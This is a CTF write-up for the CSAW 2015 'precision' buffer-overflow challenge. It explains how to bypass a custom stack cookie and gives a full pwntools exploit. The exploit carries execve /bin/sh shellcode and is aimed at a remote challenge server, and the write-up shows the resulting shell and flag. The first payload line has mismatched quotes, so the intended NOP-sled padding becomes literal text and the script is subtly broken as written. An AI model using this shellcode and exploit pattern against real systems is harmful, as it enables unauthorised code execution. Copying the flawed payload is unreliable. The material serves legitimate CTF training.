[](ctf=csaw-quals-2015)
[](type=pwn)
[](tags=stack-cookie,buffer-overflow)

We are given a [file](../precision_a8f6f0590c177948fe06c76a1831e650)


```bash
$ file precision_a8f6f0590c177948fe06c76a1831e650
precision_a8f6f0590c177948fe06c76a1831e650: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=929fc6f283d6f6c3c039ee19bc846e927103ebcd, not stripped
```
Lets disass main
```objdump
   0x0804851d <+0>:	push   ebp
   0x0804851e <+1>:	mov    ebp,esp
   0x08048520 <+3>:	and    esp,0xfffffff0
   0x08048523 <+6>:	sub    esp,0xa0
   0x08048529 <+12>:	fld    QWORD PTR ds:0x8048690
   0x0804852f <+18>:	fstp   QWORD PTR [esp+0x98]
   0x08048536 <+25>:	mov    eax,ds:0x804a040
   0x0804853b <+30>:	mov    DWORD PTR [esp+0xc],0x0
   0x08048543 <+38>:	mov    DWORD PTR [esp+0x8],0x2
   0x0804854b <+46>:	mov    DWORD PTR [esp+0x4],0x0
   0x08048553 <+54>:	mov    DWORD PTR [esp],eax
   0x08048556 <+57>:	call   0x8048400 <setvbuf@plt>
   0x0804855b <+62>:	lea    eax,[esp+0x18]
   0x0804855f <+66>:	mov    DWORD PTR [esp+0x4],eax
   0x08048563 <+70>:	mov    DWORD PTR [esp],0x8048678
   0x0804856a <+77>:	call   0x80483b0 <printf@plt>
   0x0804856f <+82>:	lea    eax,[esp+0x18]
   0x08048573 <+86>:	mov    DWORD PTR [esp+0x4],eax
   0x08048577 <+90>:	mov    DWORD PTR [esp],0x8048682
   0x0804857e <+97>:	call   0x8048410 <__isoc99_scanf@plt>
   0x08048583 <+102>:	fld    QWORD PTR [esp+0x98]
   0x0804858a <+109>:	fld    QWORD PTR ds:0x8048690
   0x08048590 <+115>:	fucomip st,st(1)
   0x08048592 <+117>:	fstp   st(0)
   0x08048594 <+119>:	jp     0x80485a9 <main+140>
   0x08048596 <+121>:	fld    QWORD PTR [esp+0x98]
   0x0804859d <+128>:	fld    QWORD PTR ds:0x8048690
   0x080485a3 <+134>:	fucomip st,st(1)
   0x080485a5 <+136>:	fstp   st(0)
   0x080485a7 <+138>:	je     0x80485c1 <main+164>
   0x080485a9 <+140>:	mov    DWORD PTR [esp],0x8048685
   0x080485b0 <+147>:	call   0x80483c0 <puts@plt>
   0x080485b5 <+152>:	mov    DWORD PTR [esp],0x1
   0x080485bc <+159>:	call   0x80483e0 <exit@plt>
   0x080485c1 <+164>:	mov    eax,ds:0x804a030
   0x080485c6 <+169>:	lea    edx,[esp+0x18]
   0x080485ca <+173>:	mov    DWORD PTR [esp+0x4],edx
   0x080485ce <+177>:	mov    DWORD PTR [esp],eax
   0x080485d1 <+180>:	call   0x80483b0 <printf@plt>
   0x080485d6 <+185>:	leave  
   0x080485d7 <+186>:	ret    
```
We see some fancy fld,fstp,fucomip etc. What is happening here is, the program is setting a cookie on the stack by itself before input and then verifies it with the same value after input. If value doesn't change it rets else it exits.
```bash
$ ./precision_a8f6f0590c177948fe06c76a1831e650 
Buff: 0xff947f78
AAAA
Got AAAA
```
The address here is the start of the input. Solves our problem of locating the input.
```bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
```
NX is disabled. This calls for a shellcode on the stack.
Payload format
> NOPs+shellcode+pad+cookie+pad+ret


Use pattern_create and pattern_offset to figure out the total length. Maintain the cookie value at proper offset and bang!

```python
from pwn import *
#s=process("./precision")
s=remote('54.173.98.115',1259)
a=s.recvline()
addr=p32(int(a.split()[1],16))
print a
payload="\x90'*(128-36)+'\x83\xec\x7f\x31\xc0\x50\x68\x2f\x2f"
payload+="\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53"
payload+='\x89\xe1\x04\x05\x04\x06\xcd\x80\xb0\x01\x31\xdb\xcd\x80'
payload+='\x47\x5a\x31\xa5'[::-1]+'\x40\x50\x15\x55'[::-1]+'A'*(12)
s.send(payload+addr)
s.interactive()
```
gives us shell
```bash
$ id
uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
$ cat flag
flag{1_533_y0u_kn0w_y0ur_w4y_4r0und_4_buff3r}
```

Flag
> flag{1_533_y0u_kn0w_y0ur_w4y_4r0und_4_buff3r}
